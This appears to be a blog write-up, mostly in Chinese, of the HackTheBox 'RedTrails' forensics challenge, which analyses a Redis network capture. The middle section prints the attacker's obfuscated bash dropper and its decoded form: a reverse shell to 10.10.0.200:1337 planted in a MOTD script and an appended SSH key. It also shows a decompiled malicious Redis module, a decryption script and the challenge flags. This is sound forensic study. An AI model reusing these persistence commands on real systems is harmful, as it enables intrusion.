---
layout: post
title: "HackTheBox - RedTrails"
date: 2026-03-15
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - RedTrails
<!-- more -->

* Challenge: https://app.hackthebox.com/challenges/RedTrails
* Challenge Scenario
    > Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.


## Recon
### 第一把 Flag
這一題給一個network flow pcap，不長，所以先follow tcp stream，發現這是一個redis protocol(RESP)，並且發現攻擊者應該是已經取得了server password並且recon了一段時間，從stream 0中可以看到其中一段flag

<img src="/assets/posts/HackTheBox/RedTrails-1.png" width=300>

### 第二把 Flag
接著看stream 1，會發現有一段類似base64 encode的string
<img src="/assets/posts/HackTheBox/RedTrails-2.png" width=300>
把關鍵的eval換成echo看看會變成什麼

```bash
$ gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(echo "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
echo "$N0q$x$Hc2$rQW"
echo '==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
' | rev |base64 -d
```
也就是把base64 reverse之後的結果再進行eval，所以rev之後decode完的結果如下
```bash
$ echo '==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
' | rev |base64 -d
#!/bin/bash

lhJVXukWibAFfkv() {
        ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'
        QOPjH='jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'
        gQIxX='ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'
    echo "$ABvnz$QOPjH$gQIxX" | base64 --decode | bash
}

x7KG0bvubT6dID2() {
        LQebW="ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL"
        gVR7i="M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52"
        bkzHk="bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH"
        q97up="ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s"
        GYJan="bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK"
        HJj6A="UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr"
        fD9Kc="R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3"
        hpAgs="SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp"
        FqOPN="emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw"
        CpJLT="Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5"
        PIx1p="cw=="
        echo "$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p" | base64 --decode | bash
}

hL8FbEfp9L1261G() {
        lhJVXukWibAFfkv
        x7KG0bvubT6dID2
}

hL8FbEfp9L1261G
```
把這個script在還原一次會變成
```bash
$ echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header
$ echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==HTB{r3d15_1n574nc35" >> ~/.ssh/authorized_keys
```
* 這是在改寫 `/etc/update-motd.d/00-header`，把原本的 MOTD 腳本換成一段 shell。`/etc/update-motd.d/` 底下的腳本通常會在某些登入流程中被執行，用來產生 登入後顯示的訊息（Message of the Day）。攻擊者把它改成一段會主動連出去的 shell，目的通常是：
    * 當有人觸發該腳本時，主機就會對 `10.10.0.200:1337` 建立連線
    * 讓遠端取得互動式 shell
    * 把「正常登入顯示訊息」機制濫用成持久化執行點
* 另一個部分則是追加一把ssh public key。只要攻擊者持有對應私鑰，就可以：
    * 透過 SSH 直接登入該帳號
    * 不需要再輸入密碼
    * 達到穩定的持久化存取

另外，我們也拿到了第二段的flag

### 第三把 Flag
繼續看Stream 2沒啥感覺，那就繼續往下看，直到Stream 6會發現攻擊者上傳了一個.so file，把這個elf file dump下來丟到ida，會發現`DoCommand()`這個function
```c
__int64 __fastcall DoCommand(__int64 a1, __int64 a2, int a3)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  v16 = a1;
  v15 = a2;
  v14 = a3;
  v36 = __readfsqword(0x28u);
  if ( a3 != 2 )
    return RedisModule_WrongArity(v16);
  size = 4096LL;
  command = RedisModule_StringPtrLen(*(v15 + 8), v21);
  stream = popen(command, "r");
  s = malloc(size);
  dest = malloc(size);
  while ( fgets(s, 8, stream) )
  {
    v3 = strlen(s);
    v4 = strlen(dest);
    if ( size <= v3 + v4 )
    {
      dest = realloc(dest, 4 * size);
      size *= 2LL;
    }
    strcat(dest, s);
  }
  src = "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz";
  v28 = "YDP7ECjzuV7sagMN";
  strncpy(v34, "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz", 32uLL);
  strncpy(v33, v28, 16uLL);
  v29 = EVP_CIPHER_CTX_new();
  v5 = EVP_aes_256_cbc();
  (EVP_EncryptInit_ex)(v29, v5, 0LL, v34, v33);
  v6 = strlen(dest);
  EVP_EncryptUpdate(v29, v35, &v17, dest, v6);
  v20 = v17;
  EVP_EncryptFinal_ex(v29, &v35[v17], &v17);
  v20 += v17;
  EVP_CIPHER_CTX_free(v29);
  v7 = 2 * v20 + 1;
  v30 = v7 - 1LL;
  v13[0] = v7;
  v13[1] = 0LL;
  v8 = 16 * ((v7 + 15LL) / 0x10uLL);
  while ( v13 != (v13 - (v8 & 0xFFFFFFFFFFFFF000LL)) )
    ;
  v9 = alloca(v8 & 0xFFF);
  if ( (v8 & 0xFFF) != 0 )
    *(&v13[-1] + (v8 & 0xFFF)) = *(&v13[-1] + (v8 & 0xFFF));
  v31 = v13;
  v18 = 0;
  v19 = 0;
  while ( v18 < v20 )
  {
    snprintf(&v31[v19], 3uLL, "%02x", v35[v18++]);
    v19 += 2;
  }
  v31[2 * v20] = 0;
  hexStringToBytes(v31, v35);
  v20 = strlen(v31) >> 1;
  v10 = RedisModule_CreateString;
  v11 = strlen(v31);
  v32 = v10(v16, v31, v11);
  RedisModule_ReplyWithString(v16, v32);
  pclose(stream);
  return 0LL;
}
```
看起來是針對response做出AES CBC的加密，這也說明了tcp stream 2中不知所以然的code
```
a64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f8dbb1fdd303a56644497353ebf17e3fb407cc36c04612c1570435507fa7e2e78c98d338f40c0b81187e6f5b549d051f6a9aa891d5642714263c8000af7d2b17c12181db077eb06dad7f843bf4e5aaca3

adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f

394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952
```

## Exploit
我是直接參考[^1]的script，在Stream 2中詳細做了什麼也可以看[^1]
```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import binascii# Your hex ciphertext

ciphertext_hex = ["a64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f8dbb1fdd303a56644497353ebf17e3fb407cc36c04612c1570435507fa7e2e78c98d338f40c0b81187e6f5b549d051f6a9aa891d5642714263c8000af7d2b17c12181db077eb06dad7f843bf4e5aaca3", "adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f", "394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952"]

for i in ciphertext_hex:
# ciphertext_hex = "86d03325daa4b4813f5f1ef94c0bc4839cf664b5"
    ciphertext = binascii.unhexlify(i)# Key and IV
    key = b"h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz" #32 bytes
    iv = b"YDP7ECjzuV7sagMN" #16 bytes# Decrypt
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()# Handle padding (PKCS#5/PKCS#7)
    padding_len = plaintext[-1]
    plaintext = plaintext[:-padding_len]
    print(plaintext.decode('utf-8'))
```

```bash
$ python exp.py
Linux redis-master 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 GNU/Linux

removed './x10SPFHN.so'

--- Installing ethminer ---
--- Enabling automatically startup ---


--- Setting env ---
ETHMINER_PATH=/tmp/ethminer
ETHMINER_PATH=/tmp/ethminer
HOSTNAME=redis-master
REDIS_DOWNLOAD_SHA=5c76d990a1b1c5f949bcd1eed90d0c8a4f70369bdbdcb40288c561ddf88967a4
PWD=/data
HOME=/root
REDIS_VERSION=7.2.1
REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-7.2.1.tar.gz
SHLVL=4
FLAG_PART=_un3xp3c73d_7r41l5!}
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env


--- Success! ---
```

最後會看到第三段的flag，組合起來如下: 
`HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}`

## Reference
[^1]:[HTB RedTrails Forensics Challenge](https://mihirps.medium.com/htb-redtrails-forensics-challange-c487fe34af3f)